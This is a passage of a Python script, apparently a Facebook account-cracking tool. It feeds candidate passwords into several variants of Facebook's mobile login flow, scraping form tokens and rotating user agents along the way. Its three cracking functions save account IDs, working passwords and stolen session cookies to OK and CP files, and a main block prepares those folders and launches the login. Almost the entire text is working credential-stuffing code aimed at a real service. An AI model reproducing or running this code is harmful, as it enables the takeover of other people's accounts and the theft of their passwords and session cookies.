d_arbiter%2F%3Fversion%3D46%23cb%3Df28f5b050bbf53c%26domain%3Dwww.blibli.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.blibli.com%252Ff25b7e9c1ad4e74%26relation%3Dopener%26frame%3Df26cc15aab5eaf%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="8", "Chromium";v="111"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1489897304628200&kid_directed_site=0&app_id=1489897304628200&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D1489897304628200%26cbt%3D1694434882102%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df850adb0aa7b2%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff25b7e9c1ad4e74%2526relation%253Dopener%26client_id%3D1489897304628200%26display%3Dtouch%26domain%3Dwww.blibli.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.blibli.com%252Flogin%253Fredirect%253D%25252F%26locale%3Den_US%26logger_id%3Df2eb5114cc8b6b%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df28f5b050bbf53c%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff25b7e9c1ad4e74%2526relation%253Dopener%2526frame%253Df26cc15aab5eaf%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df28f5b050bbf53c%26domain%3Dwww.blibli.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.blibli.com%252Ff25b7e9c1ad4e74%26relation%3Dopener%26frame%3Df26cc15aab5eaf%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r├──> Email  : {kk}{idf}{P} | PW : {kk}{pw}{P}\n└──> User Agent  : {kk}{ua}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r├──> Email  : {hh}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {U}{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ free.facebook ]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r%s%s/%s OK : %s CP : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	bahasa = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9","es-LA,es;q=0.9","es-MX,es;q=0.9"])
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=214330088590858&kid_directed_site=0&app_id=214330088590858&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D214330088590858%26cbt%3D1697129832904%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1fcb9c5433c3d8%2526domain%253Dwww.rakuten.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.rakuten.com%25252Ff2ff502629de584%2526relation%253Dopener%26client_id%3D214330088590858%26display%3Dtouch%26domain%3Dwww.rakuten.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.rakuten.com%252Fauth%252Fv2%252Fsignup%26locale%3Den_US%26logger_id%3Df7d38fdc049d7c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ff6d8bfb35904%2526domain%253Dwww.rakuten.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.rakuten.com%25252Ff2ff502629de584%2526relation%253Dopener%2526frame%253Df2e2d2e7c020ba4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ff6d8bfb35904%26domain%3Dwww.rakuten.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.rakuten.com%252Ff2ff502629de584%26relation%3Dopener%26frame%3Df2e2d2e7c020ba4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=214330088590858&kid_directed_site=0&app_id=214330088590858&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D214330088590858%26cbt%3D1697129832904%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1fcb9c5433c3d8%2526domain%253Dwww.rakuten.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.rakuten.com%25252Ff2ff502629de584%2526relation%253Dopener%26client_id%3D214330088590858%26display%3Dtouch%26domain%3Dwww.rakuten.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.rakuten.com%252Fauth%252Fv2%252Fsignup%26locale%3Den_US%26logger_id%3Df7d38fdc049d7c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ff6d8bfb35904%2526domain%253Dwww.rakuten.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.rakuten.com%25252Ff2ff502629de584%2526relation%253Dopener%2526frame%253Df2e2d2e7c020ba4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ff6d8bfb35904%26domain%3Dwww.rakuten.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.rakuten.com%252Ff2ff502629de584%26relation%3Dopener%26frame%3Df2e2d2e7c020ba4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=214330088590858&kid_directed_site=0&app_id=214330088590858&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fapp_id%3D214330088590858%26cbt%3D1697129832904%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1fcb9c5433c3d8%2526domain%253Dwww.rakuten.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.rakuten.com%25252Ff2ff502629de584%2526relation%253Dopener%26client_id%3D214330088590858%26display%3Dtouch%26domain%3Dwww.rakuten.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.rakuten.com%252Fauth%252Fv2%252Fsignup%26locale%3Den_US%26logger_id%3Df7d38fdc049d7c%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1ff6d8bfb35904%2526domain%253Dwww.rakuten.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.rakuten.com%25252Ff2ff502629de584%2526relation%253Dopener%2526frame%253Df2e2d2e7c020ba4%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv13.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ff6d8bfb35904%26domain%3Dwww.rakuten.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.rakuten.com%252Ff2ff502629de584%26relation%3Dopener%26frame%3Df2e2d2e7c020ba4%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r├──> Email  : {kk}{idf}{P} | PW : {kk}{pw}{P}\n└──> User Agent  : {b}{ua}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r├──> Email  : {hh}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {U}{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#---------------------[ METHODE-ASYNC ]---------------------#
def crackasync(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r%s%s/%s OK : %s CP : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=2077467505731265&kid_directed_site=0&app_id=2077467505731265&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fapp_id%3D2077467505731265%26auth_type%26cbt%3D1695072538219%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9d0d30a5bc6e8%2526domain%253Dwww.garuda-indonesia.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.garuda-indonesia.com%25252Ff1684aa861e868c%2526relation%253Dopener%26client_id%3D2077467505731265%26config_id%26display%3Dtouch%26domain%3Dwww.garuda-indonesia.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.garuda-indonesia.com%252Fid%252Fid%252Findex-alternate%26force_confirmation%3Dfalse%26id%3Df1acb5d53e0da88%26locale%3Den_US%26logger_id%3D823305df-d54f-472f-855d-20679d21695e%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1475beac6cd4e%2526domain%253Dwww.garuda-indonesia.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.garuda-indonesia.com%25252Ff1684aa861e868c%2526relation%253Dopener.parent%2526frame%253Df1acb5d53e0da88%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv12.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1475beac6cd4e%26domain%3Dwww.garuda-indonesia.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.garuda-indonesia.com%252Ff1684aa861e868c%26relation%3Dopener.parent%26frame%3Df1acb5d53e0da88%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr') 
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '',
'__csr': '',
'__req': random.choice(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '9', '0']), 
'__a': '',
'__user':0
}
			headers = {'Host': 'm.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent': ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=2077467505731265&kid_directed_site=0&app_id=2077467505731265&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fapp_id%3D2077467505731265%26auth_type%26cbt%3D1695072538219%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9d0d30a5bc6e8%2526domain%253Dwww.garuda-indonesia.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.garuda-indonesia.com%25252Ff1684aa861e868c%2526relation%253Dopener%26client_id%3D2077467505731265%26config_id%26display%3Dtouch%26domain%3Dwww.garuda-indonesia.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.garuda-indonesia.com%252Fid%252Fid%252Findex-alternate%26force_confirmation%3Dfalse%26id%3Df1acb5d53e0da88%26locale%3Den_US%26logger_id%3D823305df-d54f-472f-855d-20679d21695e%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1475beac6cd4e%2526domain%253Dwww.garuda-indonesia.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.garuda-indonesia.com%25252Ff1684aa861e868c%2526relation%253Dopener.parent%2526frame%253Df1acb5d53e0da88%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv12.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1475beac6cd4e%26domain%3Dwww.garuda-indonesia.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.garuda-indonesia.com%252Ff1684aa861e868c%26relation%3Dopener.parent%26frame%3Df1acb5d53e0da88%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=2077467505731265&auth_token=9100f8f4d4b33838e6914a9f474bde76&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fapp_id%3D2077467505731265%26auth_type%26cbt%3D1695072538219%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df9d0d30a5bc6e8%2526domain%253Dwww.garuda-indonesia.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.garuda-indonesia.com%25252Ff1684aa861e868c%2526relation%253Dopener%26client_id%3D2077467505731265%26config_id%26display%3Dtouch%26domain%3Dwww.garuda-indonesia.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.garuda-indonesia.com%252Fid%252Fid%252Findex-alternate%26force_confirmation%3Dfalse%26id%3Df1acb5d53e0da88%26locale%3Den_US%26logger_id%3D823305df-d54f-472f-855d-20679d21695e%26messenger_page_id%26origin%3D2%26plugin_prepare%3Dtrue%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1475beac6cd4e%2526domain%253Dwww.garuda-indonesia.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.garuda-indonesia.com%25252Ff1684aa861e868c%2526relation%253Dopener.parent%2526frame%253Df1acb5d53e0da88%26ref%3DLoginButton%26reset_messenger_state%3Dfalse%26response_type%3Dsigned_request%252Ctoken%252Cgraph_domain%26scope%26sdk%3Djoey%26size%3D%257B%2522width%2522%253Anull%252C%2522height%2522%253Anull%257D%26url%3Ddialog%252Foauth%26version%3Dv12.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=2077467505731265&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1475beac6cd4e%26domain%3Dwww.garuda-indonesia.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.garuda-indonesia.com%252Ff1684aa861e868c%26relation%3Dopener.parent%26frame%3Df1acb5d53e0da88%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r├──> Email  : {kk}{idf}{P} | PW : {kk}{pw}{P}\n└──> User Agent  : {kk}{ua}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r├──> Email  : {hh}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {U}{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#----------------------[ METHODE-REGULAR ]-----------------#
def crackregular(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	print(f'\r%s%s/%s OK : %s CP : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://iphone.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'iphone.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'yW2guQRJM3jnGatG5yBvokfcLBkNHf9n2TcoDukeOmMfVSQ2JjqH9nh8kfJmiz+n3M1iN4Le5FFdFEGSAsdQpA==','content-length': '166','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://iphone.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://iphone.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://iphone.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r├──> Email  : {kk}{idf}{P} | PW : {kk}{pw}{P}\n└──> User Agent  : {kk}{ua}{N}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r├──> Email  : {hh}{idf}{N} | PW  : {hh}{pw}{N}\n└──>  KUKIS : {U}{kuki}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()
